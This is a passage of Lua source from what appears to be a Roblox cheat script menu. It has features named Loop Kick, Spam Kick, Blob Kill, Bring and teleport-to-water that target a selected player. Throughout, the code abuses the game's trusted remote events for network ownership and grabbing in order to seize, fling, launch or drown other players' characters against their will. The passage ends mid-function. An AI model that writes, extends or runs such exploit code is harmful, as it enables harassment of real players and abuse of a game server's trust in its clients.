                notify('Error', 'Select a target first', 3)

                if Toggles.XOCUBlobKickToggle then
                    Toggles.XOCUBlobKickToggle:SetValue(false)
                end

                return
            end

            task.spawn(function()
                local RS = game:GetService('ReplicatedStorage')
                local RunService = game:GetService('RunService')
                local GE = RS:FindFirstChild('GrabEvents')
                local myChar = Player.Character
                local myRoot = myChar and myChar:FindFirstChild('HumanoidRootPart')

                if not myRoot then
                    if Toggles.XOCUBlobKickToggle then
                        Toggles.XOCUBlobKickToggle:SetValue(false)
                    end

                    return
                end

                local savedPos = myRoot.CFrame
                local dragging = false
                local grabStartTime = 0

                while kickLoopEnabled do
                    local target = getSelectedPlayer()

                    if not target or not target.Parent or not target.Character then
                        break
                    end

                    local tChar = target.Character
                    local tRoot = tChar:FindFirstChild('HumanoidRootPart')
                    local tHum = tChar:FindFirstChild('Humanoid')
                    local seat = myChar and myChar.Humanoid.SeatPart

                    if tRoot and tHum and tHum.Health > 0 then
                        tRoot.AssemblyLinearVelocity = Vector3.zero
                        tRoot.Velocity = Vector3.zero

                        if seat then
                            local blobman = seat.Parent
                            local remoteFolder = blobman:FindFirstChild('BlobmanSeatAndOwnerScript')
                            local grab = remoteFolder and remoteFolder:FindFirstChild('CreatureGrab')
                            local drop = remoteFolder and remoteFolder:FindFirstChild('CreatureDrop')
                            local L_Det = blobman:FindFirstChild('LeftDetector')
                            local R_Det = blobman:FindFirstChild('RightDetector')
                            local L_Weld = L_Det and (L_Det:FindFirstChild('LeftWeld') or L_Det:FindFirstChild('RigidConstraint'))
                            local R_Weld = R_Det and (R_Det:FindFirstChild('RightWeld') or R_Det:FindFirstChild('RigidConstraint'))

                            if grab and drop and L_Weld and R_Weld then
                                pcall(function()
                                    grab:FireServer(L_Det, tRoot, L_Weld)
                                    grab:FireServer(R_Det, tRoot, R_Weld)
                                    drop:FireServer(L_Weld, tRoot)
                                    drop:FireServer(R_Weld, tRoot)
                                end)
                            end
                        end
                        if not dragging then
                            myRoot.CFrame = tRoot.CFrame

                            if GE then
                                pcall(function()
                                    tHum.PlatformStand = true

                                    GE.SetNetworkOwner:FireServer(tRoot, myRoot.CFrame)
                                    GE.CreateGrabLine:FireServer(tRoot, Vector3.zero, tRoot.Position, false)
                                end)
                            end
                            if grabStartTime == 0 then
                                grabStartTime = tick()
                            end
                            if tick() - grabStartTime > 0.3 then
                                dragging = true
                                grabStartTime = 0
                            end
                        else
                            local lockPos = savedPos * CFrame.new(0, customKickHeight, 0)

                            myRoot.CFrame = savedPos
                            tRoot.CFrame = lockPos

                            if GE then
                                pcall(function()
                                    tHum.PlatformStand = true

                                    GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                    GE.DestroyGrabLine:FireServer(tRoot)
                                    GE.CreateGrabLine:FireServer(tRoot, Vector3.zero, tRoot.Position, false)
                                end)
                            end
                        end
                    else
                        dragging = false
                        grabStartTime = 0
                    end

                    RunService.Heartbeat:Wait()
                end

                if myRoot and savedPos then
                    myRoot.CFrame = savedPos
                end

                kickLoopEnabled = false
                loopKickDualActive = false
            end)
        else
            kickLoopEnabled = false
            loopKickDualActive = false
        end
    end,
})
BlobActiveBox:AddCheckbox('SpamKickToggle', {
    Text = '<b>[NETOWN]</b> Spam Kick',
    Default = false,
}):OnChanged(function(v)
    if not v and Toggles.ApplyBlob and Toggles.ApplyBlob.Value then
        Toggles.ApplyBlob:SetValue(false)
    end
end)
BlobActiveBox:SetupDependencies({
    {
        Options.BlobDropdown,
        '[NETOWN] Spam Kick',
        Toggles.SpamKickToggle,
    },
    {
        Options.BlobDropdown,
        '[GRAB & BLOB] Loop Kick',
        Toggles.XOCUBlobKickToggle,
    },
})

local BlobKickBox = TgtRight:AddDependencyGroupbox('Blob Kick Settings')

BlobKickBox:AddInput('KickHeightInput', {
    Text = '<b>[FOR GRAB + BLOB]</b> Kick Height',
    Default = '25',
    Placeholder = 'Studs [DEFAULT 25 STUDS]',
    Numeric = true,
    Finished = true,
    Callback = function(Value)
        customKickHeight = tonumber(Value) or 25
    end,
})
BlobKickBox:SetupDependencies({
    {
        Options.BlobDropdown,
        '[GRAB & BLOB] Loop Kick',
    },
})
Toggles.LGK_Enabled:OnChanged(function()
    local enabled = Toggles.LGK_Enabled.Value

    applyLoopGrabKick = enabled
    blobPlotWarned = false

    local kickbp, kickbg
    local cam = Workspace.CurrentCamera
    local oldCamType = cam.CameraType
    local oldCamSubject = cam.CameraSubject

    if enabled then
        task.spawn(function()
            while applyLoopGrabKick and RunService.RenderStepped:Wait() do
                local pos = HRP.CFrame
                local tt = getSelectedPlayer() or SelectedPlayer

                if not tt or not tt.Parent then
                    continue
                end
                if not tt.Character or not tt.Character.Parent or not tt.Character:FindFirstChild('HumanoidRootPart') or not tt.Character:FindFirstChild('Humanoid') or tt.Character.Humanoid.Health <= 0 then
                    if kickbp then
                        pcall(function()
                            kickbp:Destroy()
                        end)

                        kickbp = nil
                    end
                    if kickbg then
                        pcall(function()
                            kickbg:Destroy()
                        end)

                        kickbg = nil
                    end

                    repeat
                        task.wait(0.15)
                    until not applyLoopGrabKick or (tt.Character and tt.Character.Parent and tt.Character:FindFirstChild('HumanoidRootPart') and tt.Character:FindFirstChild('Humanoid') and tt.Character.Humanoid.Health > 0)

                    continue
                end
                if tt.Character and tt.Character:FindFirstChild('HumanoidRootPart') and HRP then
                    Sets.Name = tt.Name
                    Sets.Char = tt.Character
                    Sets.HRP = tt.Character.HumanoidRootPart

                    if Sets.Char.Parent ~= Workspace then
                        if not blobPlotWarned then
                            blobPlotWarned = true

                            notify('<b>UNSTABLE</b>', tt.DisplayName .. ' is in a plot.. Bring them out of the plot first.', 3)
                        end

                        continue
                    else
                        blobPlotWarned = false
                    end
                    if Sets.HRP and hum and HRP then
                        for _ = 1, 5 do
                            DestroyLine:FireServer(Sets.HRP)
                            RunService.RenderStepped:Wait()
                            SetNetOwner:FireServer(Sets.HRP, Sets.HRP.CFrame)
                        end

                        if (Sets.HRP.Position - HRP.Position).Magnitude >= 29 and Sets.Char.Parent == Workspace then
                            task.wait(0.1)

                            cam.CameraType = Enum.CameraType.Scriptable
                            cam.CFrame = cam.CFrame

                            tp(HRP, Sets.HRP)
                            task.wait(0.2)
                            sno(Sets.HRP)
                            task.wait()

                            HRP.AssemblyLinearVelocity = Vector3.zero
                            HRP.AssemblyAngularVelocity = Vector3.zero
                            Sets.HRP.AssemblyLinearVelocity = Vector3.zero
                            Sets.HRP.AssemblyAngularVelocity = Vector3.zero
                            HRP.CFrame = pos

                            task.wait(0.2)

                            for _, v in pairs(Sets.Char:GetChildren())do
                                if v:IsA('BasePart') and v.Name ~= 'Humanoid' then
                                    v.AssemblyLinearVelocity = Vector3.zero
                                    v.AssemblyAngularVelocity = Vector3.zero
                                    v.CFrame = pos * offset
                                end
                            end

                            cam.CameraType = oldCamType
                            cam.CameraSubject = oldCamSubject
                        end
                        if Sets.HRP.Position.Y < HRP.Position.Y + 4 and Sets.Char.Parent == Workspace then
                            repeat
                                task.wait()
                                sno(Sets.HRP)
                            until not applyLoopGrabKick or not Sets.Char or not Sets.Char.Parent or (Sets.Char:FindFirstChild('Head') and Sets.Char.Head:FindFirstChild('PartOwner'))

                            if not Sets.Char or not Sets.Char.Parent then
                                continue
                            end

                            HRP.AssemblyLinearVelocity = Vector3.zero
                            HRP.AssemblyAngularVelocity = Vector3.zero
                            Sets.HRP.AssemblyLinearVelocity = Vector3.zero
                            Sets.HRP.AssemblyAngularVelocity = Vector3.zero
                            HRP.CFrame = pos
                            Sets.HRP.CFrame = HRP.CFrame * offset
                        end

                        local liveOffset = Vector3.new(Options.LGK_SliderX.Value, Options.LGK_SliderY.Value, Options.LGK_SliderZ.Value)
                        local targetPos = HRP.Position + liveOffset

                        if not kickbp or kickbp.Parent ~= Sets.HRP then
                            if kickbp then
                                pcall(function()
                                    kickbp:Destroy()
                                end)
                            end

                            kickbp = Instance.new('BodyPosition')
                            kickbp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                            kickbp.D = 300
                            kickbp.P = 50000
                            kickbp.Position = targetPos
                            kickbp.Parent = Sets.HRP
                        end
                        if not kickbg or kickbg.Parent ~= Sets.HRP then
                            if kickbg then
                                pcall(function()
                                    kickbg:Destroy()
                                end)
                            end

                            kickbg = Instance.new('BodyGyro')
                            kickbg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                            kickbg.D = 300
                            kickbg.P = 50000
                            kickbg.CFrame = HRP.CFrame
                            kickbg.Parent = Sets.HRP
                        end

                        task.spawn(function()
                            for _, v in pairs(Sets.Char:GetChildren())do
                                if HasProperty(v, 'AssemblyLinearVelocity') then
                                    stvel(v)

                                    v.Velocity = Vector3.zero
                                    v.AssemblyLinearVelocity = Vector3.zero
                                    v.AssemblyAngularVelocity = Vector3.zero
                                end
                            end
                        end)

                        kickbp.Position = targetPos
                        kickbg.CFrame = HRP.CFrame
                    end
                end
            end
        end)
    else
        cam.CameraType = oldCamType
        cam.CameraSubject = oldCamSubject

        if kickbp then
            pcall(function()
                kickbp:Destroy()
            end)

            kickbp = nil
        end
        if kickbg then
            pcall(function()
                kickbg:Destroy()
            end)

            kickbg = nil
        end
        if Sets.HRP then
            if Sets.HRP:FindFirstChild('BodyPosition') then
                Sets.HRP.BodyPosition:Destroy()
            end
            if Sets.HRP:FindFirstChild('BodyGyro') then
                Sets.HRP.BodyGyro:Destroy()
            end
        end
    end
end)
Toggles.LoopGrabKickToggle:OnChanged(function(Value)
    kickLoopEnabled = Value

    if kickLoopEnabled then
        if not SelectedPlayer or SelectedPlayer == '' then
            kickLoopEnabled = false

            return
        end

        task.spawn(function()
            local targetplr = Players:FindFirstChild(SelectedPlayer)

            if not targetplr then
                kickLoopEnabled = false

                return
            end

            while kickLoopEnabled and RunService.Heartbeat:Wait() do
                local char = LocalPlayer.Character
                local hrp = char and char:FindFirstChild('HumanoidRootPart')
                local head = char and char:FindFirstChild('Head')

                if not (char and hrp and head) then
                    task.wait(0)

                    continue
                end

                targetplr = Players:FindFirstChild(SelectedPlayer)

                if not targetplr or not targetplr.Character then
                    task.wait(0)

                    continue
                end

                local Head = targetplr.Character:FindFirstChild('Head')
                local Hum = targetplr.Character:FindFirstChild('Humanoid')

                if not (Head and Hum) or Hum.Health == 0 then
                    task.wait(0)

                    continue
                end

                local BodyPos = Head:FindFirstChild('BodyPosition')

                if (Head.Position - hrp.Position).Magnitude <= 30 then
                    if not BodyPos then
                        BodyPos = Instance.new('BodyPosition')
                        BodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        BodyPos.Parent = Head
                        BodyPos.P = 45000
                        BodyPos.D = 500
                    end

                    sno(Head)

                    BodyPos.Position = head.Position + Vector3.new(0, 13, 0)

                    pcall(function()
                        ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(Head)
                    end)
                else
                    local oldCF = char:GetPivot()

                    if not Head or not Hum or Hum.Health == 0 then
                        local newChar = targetplr.CharacterAdded:Wait()

                        Head = newChar:WaitForChild('Head', 2)
                        Hum = newChar:FindFirstChild('Humanoid')
                    end

                    repeat
                        if not kickLoopEnabled then
                            break
                        end

                        pcall(function()
                            char:PivotTo(Head.CFrame * CFrame.new(0, 10, 0))
                        end)
                        sno(Head)
                        task.wait(0)
                    until not Head or (Head:FindFirstChild('PartOwner') and targetplr:FindFirstChild('IsHeld') and targetplr.IsHeld.Value) or not kickLoopEnabled

                    if Head and Head:FindFirstChild('PartOwner') then
                        task.defer(function()
                            for i = 1, 59 do
                                if not kickLoopEnabled or not Head.Parent then
                                    break
                                end

                                pcall(function()
                                    Head.CFrame = oldCF * CFrame.new(0, 15, 0)
                                end)
                                task.wait(0)
                            end
                        end)
                    end

                    pcall(function()
                        char:PivotTo(oldCF)
                    end)
                end

                task.wait(0)
            end

            if targetplr and targetplr.Character then
                local Head = targetplr.Character:FindFirstChild('Head')

                if Head then
                    local BodyPos = Head:FindFirstChild('BodyPosition')

                    if BodyPos then
                        BodyPos:Destroy()
                    end

                    pcall(function()
                        ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(Head)
                    end)
                end
            end
        end)
    else
        kickLoopEnabled = false
    end
end)
Toggles.SpamKickToggle:OnChanged(function(Value)
    spamActive = Value

    if Value then
        local targetPlayer = nil

        if _selectedPlayers and #_selectedPlayers > 0 then
            targetPlayer = Players:FindFirstChild(_selectedPlayers[1])
        end
        if not targetPlayer then
            spamActive = false

            return
        end

        local blob = findBlobman()

        if not blob then
            spamActive = false

            return
        end

        local char = LocalPlayer.Character

        if not char or not char:FindFirstChild('HumanoidRootPart') then
            spamActive = false

            return
        end

        local RightDetector = blob:FindFirstChild('RightDetector')

        if not RightDetector then
            spamActive = false

            return
        end

        local RightWeld = RightDetector:FindFirstChild('RightWeld')
        local BlobmanScript = blob:FindFirstChild('BlobmanSeatAndOwnerScript')

        if not (RightWeld and BlobmanScript) then
            spamActive = false

            return
        end

        local CreatureGrab = BlobmanScript:FindFirstChild('CreatureGrab')
        local CreatureRelease = BlobmanScript:FindFirstChild('CreatureRelease')

        if not (CreatureGrab and CreatureRelease) then
            spamActive = false

            return
        end

        task.spawn(function()
            local oldCF = char:GetPivot()
            local targetChar = targetPlayer and targetPlayer.Character

            if not targetChar or not targetChar:FindFirstChild('HumanoidRootPart') then
                spamActive = false

                return
            end

            local targetRoot = targetChar.HumanoidRootPart

            pcall(function()
                char:PivotTo(targetRoot.CFrame)
                task.wait(0.2)
                CreatureGrab:FireServer(RightDetector, targetRoot, RightWeld)
                task.wait(0.1)
                CreatureRelease:FireServer(RightWeld, targetRoot)
                task.defer(function()
                    local BodyPos = Instance.new('BodyPosition')

                    BodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    BodyPos.Position = oldCF.Position + Vector3.new(math.random(-15, 15), math.random(-10, 10), math.random(-15, 15))
                    BodyPos.Parent = targetRoot
                    BodyPos.P = 45000
                    BodyPos.D = 500
                end)
            end)
            task.wait(0.4)
            pcall(function()
                char:PivotTo(oldCF)
            end)
            task.wait(0.5)

            while spamActive do
                local un = _selectedPlayers and _selectedPlayers[1]

                targetPlayer = un and Players:FindFirstChild(un)

                if not targetPlayer then
                    spamActive = false

                    break
                end
                if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild('HumanoidRootPart') then
                    task.wait(0.9)

                    continue
                end

                targetRoot = targetPlayer.Character.HumanoidRootPart

                local targetHead = targetPlayer.Character:FindFirstChild('Head')

                pcall(function()
                    sno(targetRoot)

                    if targetHead then
                        sno(targetHead)
                    end

                    RemoteDestroyGrabLine:FireServer(targetRoot)
                    CreatureGrab:FireServer(RightDetector, targetRoot, RightWeld)

                    if targetHead then
                        GrabEvents.CreateGrabLine:FireServer(targetHead, targetHead.CFrame)
                    end

                    GrabEvents.CreateGrabLine:FireServer(targetRoot, targetRoot.CFrame)
                    CreatureRelease:FireServer(RightWeld, targetRoot)
                end)
                task.wait(0.08)
            end
        end)
    else
        spamActive = false
    end
end)
plr.CharacterAdded:Connect(function(c)
    task.wait(0.1)

    char = c
    HRP = char:WaitForChild('HumanoidRootPart')
    hum = char:WaitForChild('Humanoid')
end)

Players = game:GetService('Players')
ReplicatedStorage = game:GetService('ReplicatedStorage')
LocalPlayer = Players.LocalPlayer

function execBlobKill(targetName)
    if not targetName or targetName == '' then
        return
    end

    local plr = Players:FindFirstChild(targetName)

    if not plr or not plr.Character then
        return
    end

    local localChar = LocalPlayer.Character

    if not localChar then
        return
    end

    local hum = localChar:FindFirstChild('Humanoid')
    local hrp = localChar:FindFirstChild('HumanoidRootPart')

    if not (hum and hrp) then
        return
    end

    local blob = (hum.SeatPart and hum.SeatPart.Parent.Name == 'CreatureBlobman' and hum.SeatPart.Parent) or ensureBlobman()

    if not blob or not blob.PrimaryPart then
        return
    end

    local targetHRP = plr.Character:FindFirstChild('HumanoidRootPart')

    if not targetHRP then
        return
    end
    if targetHRP.Position.Y > HEIGHT_LIMIT then
        return
    end

    local startLocalCFrame = hrp.CFrame
    local startBlobCFrame = blob.PrimaryPart.CFrame

    blob:SetPrimaryPartCFrame(targetHRP.CFrame)

    if blob:FindFirstChild('VehicleSeat') then
        blob.VehicleSeat:Sit(hum)
        task.wait(0.2)
    end

    local detector = blob:FindFirstChild('LeftDetector')
    local weld = detector and detector:FindFirstChild('LeftWeld')

    if detector and weld then
        blob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(detector, targetHRP, weld)
    end

    task.wait(0.2)

    local targetHum = plr.Character:FindFirstChildOfClass('Humanoid')

    if targetHum then
        targetHum.RigType = Enum.HumanoidRigType.R15
    end

    task.wait(0.2)

    if weld then
        blob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(weld, targetHRP)
    end

    task.delay(0.4, function()
        hrp.CFrame = startLocalCFrame

        if blob and blob.PrimaryPart then
            blob:SetPrimaryPartCFrame(startBlobCFrame)
        end
    end)
end
function executeGrabKick()
    if not SelectedPlayer then
        return
    end

    local targetPlayer = Players:FindFirstChild(SelectedPlayer)

    if not targetPlayer or not targetPlayer.Character then
        return
    end

    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')
    local head = char and char:FindFirstChild('Head')

    if not (char and hrp and head) then
        return
    end

    local targetChar = targetPlayer.Character
    local targetHrp = targetChar:FindFirstChild('HumanoidRootPart')
    local targetHead = targetChar:FindFirstChild('Head')
    local Hum = targetChar:FindFirstChild('Humanoid')

    if not (targetHrp and targetHead and Hum) or Hum.Health == 0 then
        return
    end

    local BodyPos = targetHrp:FindFirstChild('BodyPosition')
    local BodyGyro = targetHrp:FindFirstChild('BodyGyro')

    if not BodyPos then
        BodyPos = Instance.new('BodyPosition')
        BodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        BodyPos.Parent = targetHrp
        BodyPos.P = 50000
        BodyPos.D = 1000
    end
    if not BodyGyro then
        BodyGyro = Instance.new('BodyGyro')
        BodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
        BodyGyro.Parent = targetHrp
        BodyGyro.P = 50000
        BodyGyro.D = 1000
    end

    BodyPos.Position = head.Position + Vector3.new(0, 18, 0)
    BodyGyro.CFrame = hrp.CFrame

    RemoteSetNetworkOwner:FireServer(targetHrp, targetHrp.CFrame)
    RemoteSetNetworkOwner:FireServer(targetHead, targetHead.CFrame)
    RemoteDestroyGrabLine:FireServer(targetHrp)
    RemoteDestroyGrabLine:FireServer(targetHead)

    if (targetHrp.Position - hrp.Position).Magnitude > 35 then
        local oldCF = char:GetPivot()

        repeat
            if not LoopGrabKickOn then
                break
            end

            char:PivotTo(targetHrp.CFrame * CFrame.new(0, 0, -10))
            RemoteSetNetworkOwner:FireServer(targetHrp, targetHrp.CFrame)
            RemoteSetNetworkOwner:FireServer(targetHead, targetHead.CFrame)
            task.wait()
        until (targetHrp.Position - hrp.Position).Magnitude <= 35 or targetHead:FindFirstChild('PartOwner') or not LoopGrabKickOn

        char:PivotTo(oldCF)
    end
end
function StartLoopGrabKick()
    if GrabKickHB then
        GrabKickHB:Disconnect()
    end

    LoopGrabKickOn = true
    GrabKickHB = RunService.Heartbeat:Connect(function()
        if LoopGrabKickOn then
            executeGrabKick()
        end
    end)
end
function StopLoopGrabKick()
    LoopGrabKickOn = false

    if GrabKickHB then
        GrabKickHB:Disconnect()

        GrabKickHB = nil
    end
    if SelectedPlayer then
        local tp = Players:FindFirstChild(SelectedPlayer)

        if tp and tp.Character then
            local tHrp = tp.Character:FindFirstChild('HumanoidRootPart')

            if tHrp then
                if tHrp:FindFirstChild('BodyPosition') then
                    tHrp.BodyPosition:Destroy()
                end
                if tHrp:FindFirstChild('BodyGyro') then
                    tHrp.BodyGyro:Destroy()
                end
            end
        end
    end
end
function sendToSky(root, hum)
    DisableCollisions(hum.Parent)

    local BV = Instance.new('BodyVelocity')

    BV.Velocity = Vector3.new(0, 90000, 0)
    BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    BV.P = 100
    BV.Parent = root
    hum.Sit = false
    hum.Jump = true

    task.delay(3, function()
        if BV.Parent then
            BV:Destroy()
        end
    end)
end
function executeKick()
    if not SelectedPlayer then
        return
    end

    local p = Players:FindFirstChild(SelectedPlayer)
    local c = p and p.Character
    local root = c and c:FindFirstChild('HumanoidRootPart')
    local head = c and c:FindFirstChild('Head')
    local hum = c and c:FindFirstChild('Humanoid')

    if not (root and head and hum) or hum.Health <= 0 then
        return
    end
    if isTooHigh(p) then
        return
    end
    if p:FindFirstChild('InPlot') and p.InPlot.Value then
        return
    end

    local selfChar = LocalPlayer.Character
    local selfRoot = selfChar and selfChar:FindFirstChild('HumanoidRootPart')

    if not selfRoot then
        return
    end

    local saved = selfChar:GetPivot()

    selfChar:PivotTo(CFrame.new(root.Position + Vector3.new(0, 0, -3)))
    DisableCollisions(c)
    RemoteSetNetworkOwner:FireServer(root, root.CFrame)
    task.wait()
    selfChar:PivotTo(saved)
    task.wait(0.05)
    RemoteDestroyGrabLine:FireServer(root)
    task.wait(0.05)

    local po = head:FindFirstChild('PartOwner')

    if po and po.Value == LocalPlayer.Name then
        sendToSky(root, hum)
    end
end
function BringPlayer(name, loopMode)
    if not Players:FindFirstChild(name) then
        return
    end

    local targetPlayer = Players:FindFirstChild(name)
    local targetChar = targetPlayer.Character

    if not targetChar then
        return
    end

    local targetHum = FWC(targetChar, 'Humanoid', 3)
    local targetHRP = FWC(targetChar, 'HumanoidRootPart', 3)
    local targetHead = FWC(targetChar, 'Head', 3)

    if not (targetHum and targetHRP and targetHead) then
        return
    end
    if targetHum.Health == 0 then
        return
    end
    if targetPlayer:FindFirstChild('InPlot') and targetPlayer.InPlot.Value then
        return
    end

    local mychar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local myhum = FWC(mychar, 'Humanoid', 3)
    local myHRP = FWC(mychar, 'HumanoidRootPart', 3)
    local myHead = FWC(mychar, 'Head', 3)

    if not (myhum and myHRP and myHead) then
        return
    end

    local last_pos = targetHRP.Position
    local BackUp = myHRP.CFrame

    bringTimer = 0

    function Stop(Back)
        myHRP.CFrame = Back
        bringTimer = 0
    end

    while not (targetHead:FindFirstChild('PartOwner')) or targetHead:FindFirstChild('PartOwner').Value ~= LocalPlayer.Name do
        if targetHRP and targetHRP.Parent and myhum.Health ~= 0 and targetHum.Health ~= 0 then
            if bringTimer < 74 and not (targetPlayer:FindFirstChild('InPlot') and targetPlayer.InPlot.Value) then
                bringTimer += 1

                if not LocalPlayer.IsHeld.Value then
                    myHRP.CFrame = targetHRP.CFrame + ((targetHRP.Position - last_pos) * LocalPlayer:GetNetworkPing() * 25) + Vector3.new(0, -3.5, 0)

                    task.spawn(grab, targetHRP)
                    task.wait()
                else
                    while myHead:FindFirstChild('PartOwner') do
                        Struggle:FireServer(LocalPlayer)
                        task.wait()
                    end
                end
            else
                Stop(BackUp)

                return
            end
        else
            Stop(BackUp)

            return
        end
    end

    myHRP.CFrame = BackUp

    if loopMode then
        task.spawn(function()
            while LoopBringActive and targetHead and targetHead.Parent do
                if not Players:FindFirstChild(name) then
                    LoopBringActive = false

                    break
                end
                if targetPlayer:FindFirstChild('InPlot') and targetPlayer.InPlot.Value then
                    LoopBringActive = false

                    break
                end
                if targetHum.Health <= 0 then
                    LoopBringActive = false

                    break
                end

                targetHRP.CFrame = myHRP.CFrame + myHRP.CFrame.LookVector * 3
                targetHRP.AssemblyLinearVelocity = Vector3.zero

                grab(targetHRP)
                task.wait()
            end

            if not LoopBringActive then
                Destroy_Line(targetHRP)
            end
        end)
    else
        task.defer(function()
            local startTime = tick()

            while targetHead and targetHead.Parent and targetHead:FindFirstChild('PartOwner') and targetHead.PartOwner.Value == LocalPlayer.Name and tick() - startTime < 5 do
                targetHRP.CFrame = myHRP.CFrame + myHRP.CFrame.LookVector * 3
                targetHRP.AssemblyLinearVelocity = Vector3.zero

                task.wait()
            end

            Destroy_Line(targetHRP)
        end)
    end

    bringTimer = 0
end
function SwitchPlayer()
    if switchTimer ~= 0 then
        return
    end
    if not Players:FindFirstChild(SelectedPlayer) then
        return
    end

    local targetPlayer = Players:FindFirstChild(SelectedPlayer)
    local targetChar = targetPlayer.Character

    if not targetChar then
        return
    end

    local targetHum = FWC(targetChar, 'Humanoid', 3)
    local HRP = FWC(targetChar, 'HumanoidRootPart', 3)

    if not targetHum or targetHum.Health == 0 then
        return
    end
    if targetPlayer:FindFirstChild('InPlot') and targetPlayer.InPlot.Value then
        return
    end

    local mychar = LocalPlayer.Character
    local myHRP = FWC(mychar, 'HumanoidRootPart', 3)
    local BackUp = myHRP.CFrame

    while task.wait() do
        local head = HRP.Parent:FindFirstChild('Head')

        if head and head:FindFirstChild('PartOwner') and head.PartOwner.Value == LocalPlayer.Name then
            break
        end
        if switchTimer > 75 then
            myHRP.CFrame = BackUp
            switchTimer = 0

            return
        end

        switchTimer += 1

        if Workspace.PlotItems.PlayersInPlots:FindFirstChild(SelectedPlayer) or LocalPlayer.IsHeld.Value then
            myHRP.CFrame = BackUp

            return
        end

        myHRP.CFrame = HRP.CFrame

        task.defer(grab, HRP)
    end

    for _, prt in pairs(HRP.Parent:GetChildren())do
        if prt:IsA('Part') then
            prt.Velocity = Vector3.zero
        end
    end

    HRP.CFrame = BackUp

    Destroy_Line(HRP)

    for _, prt in pairs(myHRP.Parent:GetChildren())do
        if prt:IsA('Part') then
            prt.Velocity = Vector3.zero
        end
    end

    switchTimer = 0
end
function TPPlayerToWater(name)
    if not Players:FindFirstChild(name) then
        return
    end

    local targetPlayer = Players:FindFirstChild(name)
    local targetChar = targetPlayer.Character

    if not targetChar then
        return
    end

    local targetHum = FWC(targetChar, 'Humanoid', 3)
    local targetHRP = FWC(targetChar, 'HumanoidRootPart', 3)
    local targetHead = FWC(targetChar, 'Head', 3)

    if not (targetHum and targetHRP and targetHead) then
        return
    end
    if targetHum.Health == 0 then
        return
    end
    if targetPlayer:FindFirstChild('InPlot') and targetPlayer.InPlot.Value then
        return
    end

    local mychar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local myhum = FWC(mychar, 'Humanoid', 3)
    local myHRP = FWC(mychar, 'HumanoidRootPart', 3)
    local myHead = FWC(mychar, 'Head', 3)

    if not (myhum and myHRP and myHead) then
        return
    end

    local last_pos = targetHRP.Position
    local BackUp = myHRP.CFrame

    tpTimer = 0

    function Stop(Back)
        myHRP.CFrame = Back
        tpTimer = 0
    end

    while not (targetHead:FindFirstChild('PartOwner')) or targetHead:FindFirstChild('PartOwner').Value ~= LocalPlayer.Name do
        if targetHRP and targetHRP.Parent and myhum.Health ~= 0 and targetHum.Health ~= 0 then
            if tpTimer < 74 and not (targetPlayer:FindFirstChild('InPlot') and targetPlayer.InPlot.Value) then
                tpTimer += 1

                if not LocalPlayer.IsHeld.Value then
                    myHRP.CFrame = targetHRP.CFrame + ((targetHRP.Position - last_pos) * LocalPlayer:GetNetworkPing() * 25) + Vector3.new(0, -3.5, 0)

                    task.spawn(grab, targetHRP)
                    task.wait()
                else
                    while myHead:FindFirstChild('PartOwner') do
                        Struggle:FireServer(LocalPlayer)
                        task.wait()
                    end
                end
            else
                Stop(BackUp)

                return
            end
        else
            Stop(BackUp)

            return
        end
    end

    myHRP.CFrame = BackUp

    local waterPos = Vector3.new(320, -61, 423)

    task.defer(function()
        local startTime = tick()

        while targetHead and targetHead.Parent and targetHead:FindFirstChild('PartOwner') and targetHead.PartOwner.Value == LocalPlayer.Name and tick() - startTime < 5 do
            targetHRP.CFrame = CFrame.new(waterPos)

            for _, prt in pairs(targetChar:GetChildren())do
                if prt:IsA('Part') then
                    prt.Velocity = Vector3.zero
                    prt.CanTouch = false
                end
            end

            task.wait()
        end
    end)
    task.wait(0.15)
    Destroy_Line(targetHRP)

    tpTimer = 0
end

Players = game:GetService('Players')
ReplicatedStorage = game:GetService('ReplicatedStorage')
LocalPlayer = Players.LocalPlayer

function doBring(targetName)
    if not targetName then
        return
    end

    local targetPlayer = Players:FindFirstChild(targetName)

    if not targetPlayer then
        return
    end
    if not targetPlayer.Character then
        return
    end

    local targetHead = targetPlayer.Character:FindFirstChild('Head')

    if not targetHead then
        return
    end

    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local root = character:WaitForChild('HumanoidRootPart')
    local oldCFrame = root.CFrame

    for i = 1, 2 do
        if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild('Head') then
            break
        end

        root.CFrame = targetHead.CFrame * CFrame.new(2, 0, 0)

        ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner'):FireServer(targetHead, root.CFrame)
        task.wait(0.15)
    end

    task.wait(0.1)

    root.CFrame = oldCFrame

    local front = oldCFrame.LookVector * 5

    targetHead.CFrame = CFrame.new(oldCFrame.Position + front)

    ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('DestroyGrabLine'):FireServer(targetHead)
end

Tgtnon:AddButton('BringUseGrab', {
    Text = '<b>[GRAB]</b>  Bring',
    Func = function()
        if not SelectedPlayer then
            return
        end

        local Players = game:GetService('Players')
        local ReplicatedStorage = game:GetService('ReplicatedStorage')
        local LocalPlayer = Players.LocalPlayer
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local root = character:WaitForChild('HumanoidRootPart')
        local oldCFrame = root.CFrame
        local targetPlayer = Players:FindFirstChild(SelectedPlayer)

        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild('Head') then
            local targetHead = targetPlayer.Character.Head

            for i = 1, 2 do
                if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild('Head') then
                    break
                end

                root.CFrame = targetHead.CFrame * CFrame.new(2, 0, 0)

